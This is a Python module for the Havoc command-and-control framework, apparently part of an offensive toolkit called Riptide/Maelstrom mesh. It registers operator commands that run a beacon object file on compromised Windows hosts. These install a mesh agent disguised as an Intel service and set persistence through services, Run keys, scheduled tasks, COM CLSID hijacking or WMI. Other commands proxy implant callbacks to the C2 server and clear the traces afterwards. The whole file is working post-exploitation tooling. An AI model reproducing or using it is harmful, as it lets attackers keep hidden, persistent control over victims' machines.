"""Riptide mesh BOF — overlay installer for Maelstrom / Havoc.

  mesh ram <exe> [conf]
  mesh install --client|--hub [--persist [svc|run|onlogon|clsid|wmi,...]] <exe> [conf] [svc]
  mesh proxy [host] [port]
  mesh clear [svc]
  mesh checkin
  help mesh
"""
from havoc import Demon, RegisterCommand

try:
    from havoc import RegisterModule
except ImportError:
    def RegisterModule(*_a, **_k):
        return None

import os

METHODS = {
    "svc", "service", "run", "autostart", "schtask", "onlogon", "task", "clsid", "com", "wmi",
}


def _kit_dir():
    env = os.environ.get("RIPTIDE_BOF") or os.environ.get("MESH_BOF")
    cands = []
    if env:
        cands.append(env)
    try:
        cands.append(os.path.dirname(os.path.abspath(__file__)))
    except (NameError, TypeError):
        pass
    cands.append(os.path.expanduser("~/github/maelstrom-mesh/bof"))
    cands.append(os.path.expanduser("~/github/maelstrom/modules/mesh"))
    for d in cands:
        if d and os.path.isfile(os.path.join(d, "mesh_install.x64.o")):
            return d
    return os.path.expanduser("~/github/maelstrom-mesh/bof")


def _obj_local():
    return os.path.join(_kit_dir(), "mesh_install.x64.o")


def _obj_exec():
    local = _obj_local()
    # mop → VPS TS opens this path on the teamserver host
    if os.environ.get("MAELSTROM_MOP_URL") and os.path.isfile(local):
        return "/opt/maelstrom/modules/mesh/mesh_install.x64.o"
    return local


def _is_method(s):
    if not s:
        return False
    parts = s.lower().replace("+", ",").split(",")
    return all(x.strip() in METHODS for x in parts if x.strip())


def _looks_path(s):
    if not s:
        return False
    if s.startswith("--"):
        return False
    if len(s) >= 2 and s[1] == ":":
        return True
    if s.startswith("\\\\") or s.endswith(".exe") or s.endswith(".conf"):
        return True
    return False


def _parse_install(param):
    role = "client"
    methods = ""
    persist = False
    paths = []
    i = 0
    p = list(param)
    while i < len(p):
        t = p[i]
        tl = t.lower()
        if tl in ("--hub", "-hub"):
            role = "hub"
        elif tl in ("--client", "-client"):
            role = "client"
        elif tl.startswith("--persist="):
            persist = True
            methods = t.split("=", 1)[1]
        elif tl in ("--persist", "-persist"):
            persist = True
            if i + 1 < len(p) and not p[i + 1].startswith("-") and _is_method(p[i + 1]):
                i += 1
                methods = p[i]
        else:
            paths.append(t)
        i += 1
    if persist and not methods:
        methods = "svc"
    exe = paths[0] if len(paths) > 0 else ""
    conf = paths[1] if len(paths) > 1 else ""
    svc = paths[2] if len(paths) > 2 else "IntelPma"
    return role, methods, exe, conf, svc


def _fire6(demonID, cmd, a, b, c, d, e, label):
    demon = Demon(demonID)
    local = _obj_local()
    if not os.path.isfile(local):
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "missing %s — make -C bof" % local)
        return False
    obj = _obj_exec()
    packer = Packer()
    packer.addstr(cmd)
    packer.addstr(a or "")
    packer.addstr(b or "")
    packer.addstr(c or "")
    packer.addstr(d or "")
    packer.addstr(e or "")
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, label)
    demon.InlineExecute(TaskID, "go", obj, packer.getbuffer(), False)
    return TaskID


def mesh_root(demonID, *param):
    """bare `mesh` — help, or install --client if exe given."""
    if not param:
        return mesh_help(demonID)
    if param and str(param[0]).lower() in ("help", "-h", "--help"):
        return mesh_help(demonID)
    return mesh_install(demonID, *param)


def mesh_install(demonID, *param):
    role, methods, exe, conf, svc = _parse_install(param)
    if not exe:
        demon = Demon(demonID)
        demon.ConsoleWrite(
            demon.CONSOLE_ERROR,
            "mesh install --client|--hub [--persist [svc|run|onlogon|clsid|wmi]] <exe> [conf] [svc]",
        )
        return False
    label = "mesh install --%s" % role
    if methods:
        label += " --persist %s" % methods
    return _fire6(demonID, "install", role, methods, exe, conf, svc, label)


def mesh_ram(demonID, *param):
    exe = param[0] if len(param) > 0 else ""
    conf = param[1] if len(param) > 1 else ""
    if not exe:
        d = Demon(demonID)
        d.ConsoleWrite(d.CONSOLE_ERROR, "mesh ram <exe> [peer.conf]")
        return False
    return _fire6(demonID, "ram", exe, conf, "", "", "", "mesh ram")


def mesh_persist(demonID, *param):
    return mesh_install(demonID, *(("--client", "--persist", "svc") + tuple(param)))


def mesh_hub(demonID, *param):
    return mesh_install(demonID, *(("--hub", "--persist", "svc") + tuple(param)))


def mesh_clear(demonID, *param):
    svc = param[0] if param else ""
    return _fire6(demonID, "clear", svc, "", "", "", "", "mesh clear")


def mesh_proxy(demonID, *param):
    host = param[0] if len(param) > 0 else "127.0.0.1"
    port = param[1] if len(param) > 1 else "8080"
    return _fire6(demonID, "proxy", host, port, "", "", "", "mesh proxy")


def mesh_checkin(demonID, *param):
    return _fire6(demonID, "checkin", "", "", "", "", "", "mesh checkin")


def mesh_help(demonID, *param):
    demon = Demon(demonID)
    demon.ConsoleWrite(
        demon.CONSOLE_INFO,
        "mesh ram <exe> [conf]              one session, no SCM (dies with logoff)\n"
        "mesh install --client|--hub [--persist METHOD] <exe> [conf] [svc]\n"
        "  METHOD = svc|run|onlogon|clsid|wmi  (comma ok: svc,onlogon,wmi)\n"
        "  --persist with no METHOD = svc\n"
        "  persist: 1 file %%ProgramData%%\\Intel\\Ipma\\ipmasvc.exe + HKLM conf\n"
        "mesh proxy [127.0.0.1] [8080]     Demon callback via riptide -> C2\n"
        "mesh checkin                      on/off :1080 :8080 :7670 :7668 svc=\n"
        "mesh clear [svc]\n"
        "help mesh\n"
        "example:\n"
        "  mesh ram C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf\n"
        "  mesh install --client --persist svc,onlogon C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf IntelPma\n"
        "  mesh install --hub --persist clsid,wmi C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf\n",
    )
    return True


RegisterModule(
    "mesh",
    "Riptide overlay (ram / install --client|--hub --persist / proxy / checkin / clear)",
    "API Only",
    "[mesh install --client --persist onlogon exe conf]",
    "mesh install --client --persist svc,onlogon C:\\Users\\Public\\ipmasvc.exe C:\\Users\\Public\\peer.conf",
    "",
)

RegisterCommand(mesh_root, "", "mesh", "mesh ram|install|proxy|checkin|clear (help if bare)", 0, "[ram|install|proxy|checkin|clear|help]", "help")
RegisterCommand(mesh_install, "mesh", "install", "Install --client|--hub [--persist svc|run|onlogon|clsid|wmi]", 0, "--client|--hub [--persist METHOD] <exe> [conf] [svc]", r"--client --persist svc,onlogon C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf")
RegisterCommand(mesh_ram, "mesh", "ram", "Run overlay for this session (no service)", 0, "<exe> [conf]", r"C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf")
RegisterCommand(mesh_persist, "mesh", "persist", "alias: install --client --persist svc", 0, "<exe> [conf] [svc]", r"C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf IntelPma")
RegisterCommand(mesh_hub, "mesh", "hub", "alias: install --hub --persist svc", 0, "<exe> [conf] [svc]", r"C:\Users\Public\ipmasvc.exe C:\Users\Public\peer.conf IntelPmaHub")
RegisterCommand(mesh_proxy, "mesh", "proxy", "Point Demon WinHTTP at riptide C2 proxy", 0, "[host] [port]", "127.0.0.1 8080")
RegisterCommand(mesh_checkin, "mesh", "checkin", "mesh on/off :1080 :8080 :7670 svc=", 0, "", "")
RegisterCommand(mesh_clear, "mesh", "clear", "Remove service, run, schtask, clsid, wmi, files", 0, "[svc]", "IntelPma")
RegisterCommand(mesh_help, "mesh", "help", "Show mesh commands", 0, "", "")
